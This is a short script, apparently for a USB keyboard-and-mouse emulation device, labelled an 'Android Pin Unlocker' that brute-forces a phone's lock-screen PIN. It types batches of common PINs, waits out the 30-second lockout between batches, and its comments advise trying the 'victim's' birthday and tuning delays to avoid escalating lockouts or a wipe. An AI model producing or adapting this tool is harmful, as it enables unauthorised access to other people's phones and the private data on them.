delay(500);

//Layout and Stuff

layout("DE");
console.log("Android Pin Unlocker started");
typingSpeed(0,0);
delay(500);

//Getting to the PIN Screen

console.log("Double click button 1");
doubleClick(BT1);
delay(999);
console.log("Moving mouse with button 1 pressed");
button(BT1);
moveStepped(1000,100);
button(BTNONE);
delay(3000);

//Actual PIN typing now (you can edit the numbers to whatever you want, i'd recommend using your victims birthday or year if you know it.)

type("1234\n");
type("1111\n");
type("0000\n");
type("1212\n");
type("1337\n");
delay(33000); //Delay of a bit more then 30seconds, because most Phones lock themselves for 30seconds when 5 PINS were incorrect

//Getting to the PIN Screen again: Electric Boogaloo

console.log("Double click button 1");
doubleClick(BT1);
delay(999);
console.log("Moving mouse with button 1 pressed");
button(BT1);
moveStepped(1000,100);
button(BTNONE);
delay(3000);

//Actual PIN typing again

type("7777\n");
type("2003\n");
type("2804\n");
type("2905\n");
type("1337\n");
delay(33000); // Same as before

//If you need more then that just copy paste the "Getting to the PIN Screen" here and then the PIN typing. But beware: some Phones might actually wipe themselves or Factoryreset if you try too many PINS.

//Also beware: Some Phones increase the amount of time they stay locked after the wrong PIN entrys. Some may decrease the amount of wrong PINs needed to lock themselves.
//Research beforehand and edit the delays and amount of PINs accordingly
